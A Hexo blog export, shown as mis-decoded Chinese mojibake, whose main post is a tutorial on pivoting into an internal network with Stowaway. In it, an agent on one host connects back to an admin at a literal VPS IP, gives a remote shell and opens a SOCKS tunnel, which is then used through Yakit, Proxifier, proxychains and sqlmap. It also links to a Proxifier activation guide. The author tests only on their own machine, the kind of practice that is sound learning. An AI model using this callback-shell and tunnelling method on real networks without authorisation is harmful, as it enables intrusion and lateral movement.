    <content type="html"><![CDATA[<h1 id="å†…ç½‘ä»£ç†"><a href="#å†…ç½‘ä»£ç†" class="headerlink" title="å†…ç½‘ä»£ç†"></a>å†…ç½‘ä»£ç†</h1><h2 id="å®‰è£…é…ç½®stowaway"><a href="#å®‰è£…é…ç½®stowaway" class="headerlink" title="å®‰è£…é…ç½®stowaway"></a>å®‰è£…é…ç½®stowaway</h2><p>Stowawayä¸‹è½½åœ°å€ï¼š<a href="https://github.com/ph4ntonn/Stowaway/releases">https://github.com/ph4ntonn/Stowaway/releases</a></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402231515350.png" alt="image-20250402231515350"></p><p>æˆ‘ä½¿ç”¨çš„äº‘æœåŠ¡å™¨Ubuntuä½œä¸ºadminï¼Œè‡ªå·±çš„ä¸»æœºä½œä¸ºagentï¼Œæ‰€ä»¥é€‰æ‹©ä¸Šé¢è¿™ä¿©</p><p>æŠŠ<code>linux_x64_admin</code>æ”¾åœ¨è‡ªå·±çš„VPSä¸Š</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232141778.png" alt="image-20250402232141778"></p><p><code>windows_x64_agent.exe</code>å°±æ”¾åœ¨è‡ªå·±ä¸»æœºé‡Œ</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232241256.png" alt="image-20250402232241256"></p><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">åœ¨adminä¸Šï¼š./linux_x64_admin -l <span class="hljs-tag">&lt;<span class="hljs-name">ç«¯å£å·</span>&gt;</span><br>åœ¨agentä¸Šï¼š./windows_x64_agent.exe -c <span class="hljs-tag">&lt;<span class="hljs-name">adminçš„IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">adminçš„ç«¯å£</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œçš„å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">åœ¨adminä¸Šï¼š./linux_x64_admin -l 9999<br>åœ¨agentä¸Šï¼š./windows_x64_agent.exe -c 47.122.75.126:9999<br></code></pre></td></tr></table></figure><p>å¯èƒ½åœ¨adminæœºä¸Šæ‰§è¡Œå‘½ä»¤æ—¶ä¼šå‡ºç°ä»¥ä¸‹æƒé™æŠ¥é”™</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232706627.png" alt="image-20250402232706627"></p><p>è¿™æ—¶åªè¦è¾“å…¥ä»¥ä¸‹å‘½ä»¤å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x linux_x64_admin<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402232840262.png" alt="image-20250402232840262"></p><p>ç„¶ååœ¨è‡ªå·±ä¸»æœºä¸Šè¾“å…¥å‘½ä»¤ï¼Œæ³¨æ„è¦åœ¨<code>Windows PowerShell</code>é‡Œè¾“å…¥å‘½ä»¤</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402233520977.png" alt="image-20250402233520977"></p><p>ç„¶åå°±ä¼šå‘ç°vpsä¸Šå¤šå‡ºäº†<code>(admin) &gt;&gt;</code>ï¼Œè¿™å°±æ˜¯æˆåŠŸè¿ä¸Šäº†</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402233622733.png" alt="image-20250402233622733"></p><p>ç„¶åè¾“å…¥<code>help</code>æˆ–è€…<code>h</code>å°±å¯ä»¥æŸ¥çœ‹å‘½ä»¤</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402233812557.png" alt="image-20250402233812557"></p><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>help</td><td>æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€å‘½ä»¤</td></tr><tr><td>detail</td><td>æ˜¾ç¤ºå·²è¿æ¥èŠ‚ç‚¹çš„ä¿¡æ¯</td></tr><tr><td>topo</td><td>æ˜¾ç¤ºèŠ‚ç‚¹çš„æ‹“æ‰‘ç»“æ„ï¼Œç›´è§‚äº†è§£å„èŠ‚ç‚¹é—´çš„è¿æ¥å…³ç³»ã€å¸ƒå±€ç­‰æƒ…å†µ</td></tr><tr><td>use <id></td><td>ç”¨æ¥é€‰æ‹©ç”¨æˆ·æƒ³è¦ä½¿ç”¨çš„ç›®æ ‡èŠ‚ç‚¹</td></tr><tr><td>exit</td><td>ç”¨äºé€€å‡ºç¨‹åº</td></tr></tbody></table><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402234326936.png" alt="image-20250402234326936"></p><p>è¿™é‡Œ<code>detail</code>å±•ç¤ºè¿æ¥èŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨å‘½ä»¤<code>use 0</code>é€‰æ‹©è¿è¿™ä¸ªä¸»æœºï¼Œå¯ä»¥ä¸€æ¬¡è¿æ¥å¤šä¸ªï¼Œå¦‚æœæœ‰å¤šä¸ªå°±<code>use &lt;id&gt;</code>ï¼Œ<code>id</code>å°±æ˜¯å‰é¢çš„<code>Node[id]</code></p><p>è¿ä¸Šåè¾“å…¥<code>help</code>å‘½ä»¤ï¼Œä¸»è¦ç”¨<code>socks</code></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402234947008.png" alt="image-20250402234947008"></p><p>æ¯”å¦‚è¾“å…¥<code>shell</code>å°±æ‹¿åˆ°è¿æ¥çš„ä¸»æœºæƒé™ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚<code>ipconfig</code>æŸ¥çœ‹<code>IP</code></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250402235411194.png" alt="image-20250402235411194"></p><p>è™½ç„¶æœ‰ä¹±ç ä½†æ˜¯æ— ä¼¤å¤§é›…ï¼Œåªè¦è¾“å…¥å‘½ä»¤æ”¹ä¸º<code>utf-8</code>å°±è¡Œäº†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chcp</span> <span class="hljs-number">65001</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403000349590-1745557655943-1.png" alt="image-20250403000349590"></p><p>æ¥ä¸‹æ¥å¼€ä¸€ä¸ª<code>socks</code>è¿›è¡Œæµé‡è½¬å‘</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks</span> <span class="hljs-number">15000</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403000622117-1745557659184-3.png" alt="image-20250403000622117"></p><p>åƒä¸Šé¢å›¾è¿™æ ·å°±æ˜¯å¼€æˆåŠŸäº†ï¼Œç„¶åæ˜¯æƒ³è¦åœ¨è‡ªå·±æœ¬æœºä¸Šæ‰§è¡Œå‘½ä»¤æ‰“åˆ°å†…ç½‘æœ‰ä¸‰ç§æ–¹å¼</p><h2 id="ç¬¬ä¸€ç§æ˜¯ä½¿ç”¨Yakit"><a href="#ç¬¬ä¸€ç§æ˜¯ä½¿ç”¨Yakit" class="headerlink" title="ç¬¬ä¸€ç§æ˜¯ä½¿ç”¨Yakit"></a>ç¬¬ä¸€ç§æ˜¯ä½¿ç”¨<code>Yakit</code></h2><p>Yakit ä¸‹è½½ç½‘å€ï¼š<a href="https://yaklang.com/">https://yaklang.com/</a></p><p>å…ˆæ¥é…ç½®ä¸€ä¸‹ Yakit</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403001646226-1745557663297-5.png" alt="image-20250403001646226"></p><p>ç‚¹å‡»é€‰æ‹©è¿™ä¸ªé¡¹ç›®</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403001726874-1745557667098-7.png" alt="image-20250403001726874"></p><p>ç„¶åç‚¹å‡»å·¦ä¸Šè§’çš„ MITM</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002025559-1745557671758-9.png" alt="image-20250403002025559"></p><p>ç„¶åé…ç½®ï¼Œä¸‹æ¸¸ä»£ç†å¦‚ä¸‹å¡«å†™</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">socks5://<span class="hljs-tag">&lt;<span class="hljs-name">adminçš„IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">adminçš„ç«¯å£</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œçš„å°±æ˜¯</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">socks5:</span><span class="hljs-comment">//47.122.75.126:15000</span><br></code></pre></td></tr></table></figure><p>ç„¶åç‚¹å‡»åŠ«æŒå¯åŠ¨</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002413167-1745557677013-11.png" alt="image-20250403002413167"></p><p>ç„¶ååœ¨å¼¹å‡ºçš„æµè§ˆå™¨è¾“å…¥è¿æ¥çš„ä¸»æœºçš„ipå’Œç«¯å£</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002615527-1745557680916-13.png" alt="image-20250403002615527"></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002710313-1745557684309-15.png" alt="image-20250403002710313"></p><p>å¯èƒ½ä¼šå‡ºç°ä¸Šé¢è¿™æ ·ï¼ŒæŠŠ<code>https</code>æ”¹æˆ<code>http</code>å°±è¡Œ</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002746222-1745557687495-17.png" alt="image-20250403002746222"></p><p>æ¥ä¸‹æ¥å°±åªè¦çŸ¥é“æ–‡ä»¶è·¯å¾„å°±å¯ä»¥è®¿é—®äº†</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403002856812-1745557691220-19.png" alt="image-20250403002856812"></p><p>ä¸è¿‡æˆ‘è¿™é‡Œæ˜¯åœ¨æˆ‘è‡ªå·±çš„ä¸»æœºé‡Œæçš„ï¼Œä¼¼ä¹æœ¬æ¥å°±å¯ä»¥è¿æ¥ä¸Š</p><h2 id="ç¬¬äºŒç§æ˜¯ç”¨Proxifier"><a href="#ç¬¬äºŒç§æ˜¯ç”¨Proxifier" class="headerlink" title="ç¬¬äºŒç§æ˜¯ç”¨Proxifier"></a>ç¬¬äºŒç§æ˜¯ç”¨<code>Proxifier</code></h2><p>Proxifierä¸‹è½½æ¿€æ´»åšå®¢ï¼š<a href="https://www.cnblogs.com/wushiyiwuzhong/p/17809020.html">https://www.cnblogs.com/wushiyiwuzhong/p/17809020.html</a></p><p>è¿›è¡Œé…ç½®ï¼Œæ‰¾åˆ°å¯¼èˆªæ  Profile-&gt;Proxy Servers</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403010419632-1745557696161-21.png" alt="image-20250403010419632"></p><p>æ·»åŠ ä¸€ä¸ªä»£ç†</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403010858948-1745557700258-23.png" alt="image-20250403010858948"></p><p>ç„¶åè¿˜è¦é…ç½®ä¸€ä¸ªï¼Œå°±æ˜¯ç¬¬äºŒä¸ª Proxification Rules</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403011335167-1745557703543-25.png" alt="image-20250403011335167"></p><p>ç°åœ¨å°±ç›¸å½“äºåœ¨æˆ‘ä¸»æœºçš„å†…ç½‘ä¸Šäº†ï¼ˆè™½ç„¶æˆ‘ç°åœ¨æœ¬èº«å°±æ˜¯ç”¨çš„è‡ªå·±çš„ä¸»æœºï¼Œä¸è¿‡è¿‡ç¨‹å°±æ˜¯è¿™ä¸ªè¿‡ç¨‹ï¼‰</p><h2 id="ç¬¬ä¸‰ç§æ˜¯ä½¿ç”¨åœ¨kalié‡Œçš„proxychains"><a href="#ç¬¬ä¸‰ç§æ˜¯ä½¿ç”¨åœ¨kalié‡Œçš„proxychains" class="headerlink" title="ç¬¬ä¸‰ç§æ˜¯ä½¿ç”¨åœ¨kalié‡Œçš„proxychains"></a>ç¬¬ä¸‰ç§æ˜¯ä½¿ç”¨åœ¨<code>kali</code>é‡Œçš„<code>proxychains</code></h2><p>åœ¨kaliä¸­æ˜¯è‡ªå¸¦<code>proxychains</code>çš„</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403003441163-1745557706372-27.png" alt="image-20250403003441163"></p><p>ä½¿ç”¨è¿™ä¸ªå‰è¦è¿›è¡Œé…ç½®æ–‡ä»¶</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/proxychains4.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥æ‹‰åˆ°æœ€åä¸€è¡Œï¼Œå¦‚ä¸‹å›¾</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403003827997-1745557709281-29.png" alt="image-20250403003827997"></p><p>ç„¶åæŠŠ<code>socks4</code>é‚£è¡Œæ³¨é‡Šæ‰ï¼Œåœ¨æœ€ååŠ å…¥<code>socks5 &lt;adminçš„IP&gt; &lt;adminçš„ç«¯å£&gt;</code></p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403004047794-1745557712320-31.png" alt="image-20250403004047794"></p><p>ä¿å­˜é€€å‡ºï¼Œè¿™å°±å’Œå‰é¢çš„ä¸€æ ·åšæµé‡è½¬å‘</p><p>ç„¶åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œåœ¨å‰é¢åŠ å…¥<code>proxychains</code>å°±è¡Œ</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403004412418-1745557715271-33.png" alt="image-20250403004412418"></p><p>ç”šè‡³å¯ä»¥è·‘sqlmap</p><p><img src="/2025/04/25/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20250403004640275-1745557719747-35.png" alt="image-20250403004640275"></p><p>OKï¼Œå®Œäº‹ï¼Œæ’’èŠ±~~~</p>]]></content>
    
    
    <categories>
      
      <category>å°çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°çŸ¥è¯† å†…ç½‘ä»£ç†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/04/25/hello-world/"/>
    <url>/2025/04/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>test</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
